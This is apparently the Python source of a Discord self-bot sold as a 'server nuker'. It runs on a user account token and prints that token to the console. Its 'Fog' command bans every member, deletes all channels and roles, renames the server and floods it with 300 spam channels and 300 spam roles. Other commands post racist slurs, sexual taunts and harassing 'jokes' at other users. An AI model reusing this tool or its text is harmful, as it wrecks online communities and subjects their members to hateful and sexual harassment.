class ServerNuker():
    __version__ = 3.5

import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes, pokepy
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging

from discord.ext import (
    commands,
    tasks
)
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
from PIL import Image
import pyPrivnote as pn
from gtts import gTTS
from randomuser import RandomUser
from pythonping import ping as pyping

ctypes.windll.kernel32.SetConsoleTitleW(f'[Flash Server Wizz Tool v{ServerNuker.__version__}] | Loading in...')

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('pass')
prefix = config.get('prefix')
anti_afk = config.get('anti_afk')

width = os.get_terminal_size().columns  
def startprint():
     if anti_afk == True:
         antiafk = 'Enabled'
     else:
        antiafk = 'Disabled'

     print(f'''{Fore.RESET}
                      {Fore.RED}  _          _            _         _   _         _       
                      {Fore.RED} /\ \       /\ \         /\ \      /\_\/\_\ _    /\ \     
                     {Fore.RED} /  \ \     /  \ \        \ \ \    / / / / //\_\ /  \ \    
                    {Fore.RED} / /\ \ \   / /\ \ \       /\ \_\  /\ \/ \ \/ / // /\ \ \   
                  {Fore.RED}  / / /\ \_\ / / /\ \_\     / /\/_/ /  \____\__/ // / /\ \ \  
                {Fore.RED}   / / /_/ / // / /_/ / /    / / /   / /\/________// / /  \ \_\ 
                {Fore.RED}  / / /__\/ // / /__\/ /    / / /   / / /\/_// / // / /   / / / 
                {Fore.RED} / / /_____// / /_____/    / / /   / / /    / / // / /   / / /  
               {Fore.RED} / / /      / / /\ \ \  ___/ / /__ / / /    / / // / /___/ / /   
               {Fore.RED}/ / /      / / /  \ \ \/\__\/_/___\\/_/    / / // / /____\/ /    
               {Fore.RED}\/_/       \/_/    \_\/\/_________/        \/_/ \/_________/     
  
                                    
                        {Fore.RED}Logged In As ==> {Fore.WHITE}{Ioxide.user.name}#{Ioxide.user.discriminator}{Fore.WHITE}
                        {Fore.RED}ID ==> {Fore.WHITE}{Ioxide.user.id}
                        {Fore.RED}Anti-AFK ==> {Fore.WHITE}{antiafk}
                        {Fore.RED}Version ==> {Fore.WHITE} v{ServerNuker.__version__}
                    '''+Fore.RESET)


def Clear():
    os.system('cls')
Clear()

def Init():
    if config.get('token') == "token-here":
        Clear()
        print(f"{Fore.WHITE}[ERROR] {Fore.YELLOW}You didnt put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            Ioxide.run(token, bot=False, reconnect=True)
            os.system(f'title [ Flash Nuker ] - Version {ServerNuker.__version__}')
        except discord.errors.LoginFailure:
            print(f"{Fore.WHITE}[ERROR] {Fore.YELLOW}Sure this is a token? lol"+Fore.RESET)
            os.system('pause >NUL')

class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()

colorama.init()
Ioxide = discord.Client()
Ioxide = commands.Bot(
    description='Flash Bot',
    command_prefix=prefix,
    self_bot=True
)
Ioxide.remove_command('help') 

@Ioxide.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Couldnt send a empty message"+Fore.RESET)               
    else:
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}{error_str}"+Fore.RESET)

@Ioxide.event
async def on_message_edit(before, after):
    await Ioxide.process_commands(after)

@Ioxide.event
async def on_message(message):
    responses = ["what nigga", "shut up and focus son", "nigga im right here lmfao", "sybau and focus on gettin blazed","I got 2 dicks in my ass and u still cant pack me. fuck up nigga"]
    nums = [1, 1.3, 1.5, 2, 2.3, 2.6, 3, 3.8, 5, 4, 6, 7]
    ptime = random.choice(nums)
    ## Begin Long Annoying Anti-AFK Checking..
    if 'afk c' in message.content:
        if anti_afk == True:
                try:
                    randomResponses = random.choice(responses)
                    msg = randomResponses
                    time.sleep(ptime)
                    await message.channel.send(msg)
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)
    elif 'AFK C' in message.content:
        if anti_afk == True:
            try:
                randomResponses = random.choice(responses)
                time.sleep(ptime)
                msg = randomResponses
                await message.channel.send(msg)
            except discord.errors.Forbidden:
                print(""
                f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)

    elif 'AFK c' in message.content:
        if anti_afk == True:
            try:
                randomResponses = random.choice(responses)
                time.sleep(ptime)
                msg = randomResponses
                await message.channel.send(msg)
            except discord.errors.Forbidden:
                print(""
                f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)
        return

    await Ioxide.process_commands(message)

@Ioxide.event
async def on_connect():
    Clear()

    if anti_afk == True:
        antiafk = "Enabled"
    else:
        antiafk = "Disabled"

    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f'[ Flash Nuker Tool v{ServerNuker.__version__} ] | Logged in as {Ioxide.user.name}')

@Ioxide.command()
async def help(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="_Assassination_",color= discord.Color(0x000000))
    em.add_field(name="_*massban*_",value="under construction",inline=False)
    em.add_field(name="_*AntiAfk and afk*_",value="Anti afk under contruction but use check to afk check",inline=False)
    em.add_field(name="_*nuke*_",value="destroys channels and roles",inline=False)
    em.add_field(name="_*Trolling*_",value="under contruction",inline=False)
    em.add_field(name="_*nsfw*_",value="view all nsfw commands",inline=False)
    em.set_image(url="https://media1.tenor.com/images/cedf45c21467197758874dec0f640056/tenor.gif?itemid=12494509")
    em.set_footer(text="Get killed loser")
    await ctx.send(embed=em)
@Ioxide.command()
async def nsfw(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="__NSFW__",color= discord.Color(0x808080))
    em.add_field(name="fuck",value=none,inline=False)
    em.add_field(name="boobs",value=none,inline=False)
    em.add_field(name="pussy",value=none,inline=False)
    em.add_field(name="cum",value=none,inline=False)
    em.add_field(name="head",value=none,inline=False)
    em.add_field(name="anal",value=none,inline=False)
    em.add_field(name="kiss",value=none,inline=False)
    em.add_field(name="spank",value=none,inline=False)
    em.set_image(url="https://media1.tenor.com/images/060bede0ab59dab35cfb0b9413c50a22/tenor.gif?itemid=5787004")
    em.set_footer(text="get them cheeks wrecked")
    await ctx.send(embed=em)
@Ioxide.command()
async def fuck(ctx, recipients):
    await ctx.message.delete() 
    if isinstance(ctx.message.channel, discord.GroupChannel): # makes it work in gcs (finally got it i was so retarded LOL)
        r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**fucked**_ '+recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])

    elif isinstance(ctx.message.channel, discord.DMChannel): # makes it work in dms
            r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
            res = r.json()
            em = discord.Embed(description=Ioxide.user.name+' _**fucked**_ '+recipients, color= discord.Color(0x000000))
            em.set_image(url=res['url'])
    await ctx.send(embed=em) 
@Ioxide.command()
async def anal(ctx, recipients):
    await ctx.message.delete() 
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/anal")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**gave**_ '+recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])

    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/anal")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**gave**_ '+recipients+' _**anal**_ ', color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em) 
@Ioxide.command()
async def afk(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="_AFK Help_",color= discord.Color(0x000000))
    em.add_field(name="_*AfkCheck*_",value="Starts an afk check",inline=False)
    em.set_image(url="https://38.media.tumblr.com/76bdebcb26c76890f13a12898487aa3c/tumblr_niapwy2wOP1rcjxolo2_500.gif")
    em.set_footer(text="dont fold lmfao")
    await ctx.send(embed=em)
@Ioxide.command(aliases=['sayajoke','jokepack'])
async def joke(ctx):
    ## idfk how to do tables for the jokes or this would be cleaner
    jokes = ["Nigga you overdosed from adrenaline rushes nigga fuck is you sayin","Aye nigga the first time you rode a skateboard you started twisting yo spine back and forth thinking you was accelerating nigga you dumb as shit","That wasn't funny nigga that's why yo long lost pet jaguar was found in west virginia eating rat soup in a pawn shop nigga you ugly as shit","That's why all yo subscribers unsubbed from yo youtube channel the first time you did a face-cam because you was ugly as shit","you smell like shit boy you shower with orange juice smelly ass nigga","you have sex with indian cockaroaches goofy ass nigga","your tities built like doritos nasty ass nigga Mmmm doritos nacho titty ass nigga","When you sneeze you got no recoil boy you be sendin yo spit everywhere"]
    await ctx.message.delete()
    randomJoke = random.choice(jokes)
    msg = randomJoke
    await ctx.send(msg)
   
@Ioxide.command()
async def wizzing(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="_*Wizzing Help*_",color= discord.Color(0x000000))
    em.add_field(name="_*Destroy*_",value="Fucks a servers channels and roles",inline=False)
    em.set_image(url="https://pa1.narvii.com/5873/f7b9d2a89cf47fcaf97c3330dc6544aa335ec586_hq.gif")
    em.set_footer(text="Nothing but a L for u")
    await ctx.send(embed=em)
@Ioxide.command()
async def check(ctx):
    await ctx.message.delete()
    await ctx.send('afk check')
    time.sleep(0.4)
    await ctx.send('10')
    time.sleep(0.4)
    await ctx.send('9')
    time.sleep(0.4)
    await ctx.send('8')
    time.sleep(0.4)
    await ctx.send('7')
    time.sleep(0.4)
    await ctx.send('6')
    time.sleep(0.4)
    await ctx.send('5')
    time.sleep(0.4)
    await ctx.send('4')
    time.sleep(0.4)
    await ctx.send('3')
    time.sleep(0.4)
    await ctx.send('2')
    time.sleep(0.4)
    await ctx.send('1')
    time.sleep(0.4)
    await ctx.send('0')
       
@Ioxide.command()
async def blood(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="_GET YOUR LIFE BACK IN BLOOD_",color= discord.Color(0x000000))
    em.set_image(url="https://giffiles.alphacoders.com/135/135399.gif")
    await ctx.send(embed=em)
    
@Ioxide.command()
async def smoke(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="_WHO I SMOKE???_",color= discord.Color(0x000000))
    em.add_field(name="_*My Sons*_",value="Flex, Zeus Account, Shirus, Skeezer, Kami",inline=False)
    await ctx.send(embed=em)
    
    
@Ioxide.command()
async def maker(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="_GodSpeed_",color= discord.Color(0x000000))
    em.add_field(name="_**Primo made this**_",value="ScreamW",inline=False)
    em.set_image(url="https://data.whicdn.com/images/216806169/original.gif")
    em.set_footer(text="Made By Primo")
    await ctx.send(embed=em)
@Ioxide.command()
async def cum(ctx, recipients):
    await ctx.message.delete() 
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/cum")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**came inside**_ '+recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])

    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/cum")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**came inside**_ '+recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em) 

@Ioxide.command()
async def head(ctx, recipients):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/blowjob")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**got head from**_ '+ recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/blowjob")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**got head from**_ '+ recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Ioxide.command()
async def spank(ctx, recipients):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/spank")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**spanked**_ '+ recipients+"'s _**fat ass**_ ", color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/spank")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**spanked**_ '+ recipients+"'s _**fat ass**_ ", color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Ioxide.command()
async def boobs(ctx, recipients):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/boobs")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**played with**_ '+ recipients +"'s _**boobs**_ ", color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/boobs")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**played with**_ '+ recipients +"'s _**boobs**_ ", color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Ioxide.command()
async def pussy(ctx, recipients):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/pussy")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**fucked**_ '+ recipients +"'s _**wet pussy**_ ", color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/pussy")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**fucked**_ '+ recipients +"'s _**wet pussy**_ ", color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Ioxide.command()
async def kiss(ctx, recipients):
    await ctx.message.delete() 
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/kiss")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**kissed**_ '+recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])

    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/kiss")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**kissed**_ '+recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em) 
@Ioxide.command()
async def hammer(ctx, recipients):
    await ctx.message.delete() 
    if isinstance(ctx.message.channel, discord.GroupChannel):
        em = discord.Embed(description=Ioxide.user.name+' _**gave**_ '+recipients+' _**a death punch**_', color= discord.Color(0x000000))
        em.set_image(url="https://78.media.tumblr.com/37dadedf277dd7c06d802130225cf5fb/tumblr_inline_o3346rGusF1r8a94o_500.gif")

    elif isinstance(ctx.message.channel, discord.DMChannel):
        em = discord.Embed(description=Ioxide.user.name+' _**punched**_ '+recipients+' _**lights out**_ ', color= discord.Color(0x000000))
        em.set_image(url="https://78.media.tumblr.com/37dadedf277dd7c06d802130225cf5fb/tumblr_inline_o3346rGusF1r8a94o_500.gif")
    await ctx.send(embed=em) 
@Ioxide.command(aliases=['serverdestroy','ruinserver','doafredo'])
async def Fog(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="Primo W",
            description="We are your gods",
            reason="LOL",
            icon=none,
            banner=None
        )
    except:
        pass
    for _i in range(300):
        await ctx.guild.create_text_channel(name="Primo fucked you")
    for _i in range(300):
        await ctx.guild.create_role(name="sheeeesh", color=RandomColor())

if __name__ == '__main__':
    Init()


